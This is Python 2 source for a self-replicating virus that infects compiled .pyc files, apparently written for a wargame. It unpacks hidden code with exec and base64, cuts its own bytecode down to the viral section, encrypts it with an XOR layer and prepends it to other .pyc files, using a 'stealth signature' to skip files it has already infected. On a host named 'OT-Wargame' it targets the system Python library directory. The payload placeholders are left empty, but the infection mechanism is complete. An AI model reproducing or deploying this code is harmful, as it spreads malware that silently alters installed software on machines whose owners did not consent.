__py_version__ = "PY_2.6" # haha bullshit, this is a stealth signature
# -*- coding: utf-8 -*-

import socket
import marshal
import zlib
import glob
from base64 import b64decode, b64encode

a = None
DECRYPT = None
exec b64decode("__XOR_LAYER_PY__")
crypt = a

if __file__.endswith('.pyc'):
    template = b64decode("__TEMPLATE_PY__")
    template = template.replace("__DECRYPT_PLACEHOLDER__", DECRYPT)

    LOAD_CONST = None
    RETURN_VALUE = None
    Code = None
    CodeList = None
    EXEC_STMT = None
    exec b64decode("__BYTEPLAY_PY__")

    f = open(__file__, 'r')
    head = f.read(8)
    data = Code.from_code(marshal.loads(f.read()))
    f.close()
    payload = data

    EXPLOIT_SIZE = None
    for i in xrange(2, len(data.code)):
        if type(data.code[i][1]) == type('') and data.code[i][1] == __py_version__: #signature
            EXPLOIT_SIZE = i + 2
            break
            #if not EXPLOIT_SIZE:
            #print "EXPLOIT_SIZE not found"

    data.code = data.code[:EXPLOIT_SIZE]
    data.code.append((LOAD_CONST, None))
    data.code.append((RETURN_VALUE, None))
    payload_clear = zlib.compress(marshal.dumps(data.to_code()))

    def infect(f_to_infect):
        #print "j'infecte %s" % f_to_infect
        if f_to_infect.endswith("socket.pyc"):
            return

        f = open(f_to_infect, 'r')

        head = f.read(8)

        data = Code.from_code(marshal.loads(f.read()))
        if data.code[1][1] == __py_version__: #signature
            return

        f.close()

        payload = b64encode(crypt(payload_clear))
        template_for_this_inject = template.replace("__PAYLOAD_PLACEHOLDER__", payload)
        payload = Code.from_code(compile(template_for_this_inject, "", "exec")).code
        payload = payload[:-2]
        data.code[:0] = payload

        newfile = open(f_to_infect, 'w')
        newfile.write(head)
        marshal.dump(data.to_code(), newfile)
        newfile.close()


    if socket.gethostname() == "OT-Wargame":
        target_dir = "/usr/lib/python2.6/*.pyc"
    else:
        target_dir = "./targets/*.pyc"

    for i in glob.glob(target_dir):
        infect(i)

    exec b64decode("__PAYLOAD_PY__")

__py_version__ = "PY_2.6" # haha bullshit, this is a stealth signature
